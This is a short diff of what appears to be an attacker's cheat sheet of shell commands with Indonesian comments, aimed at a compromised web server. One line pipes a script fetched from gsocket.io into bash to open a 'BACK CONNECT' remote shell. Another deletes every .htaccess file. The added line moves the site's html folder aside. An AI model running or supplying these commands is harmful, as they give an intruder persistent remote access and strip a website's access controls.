@@ -1,3 +1,5 @@
+mv html htmlBak (PINDAH FOLDER)
+
 bash -c "$(curl -fsSL https://gsocket.io/y)" (BACK CONNECT)
 
 find . -name ".htaccess" -delete ( semua file .htaccess hilang )
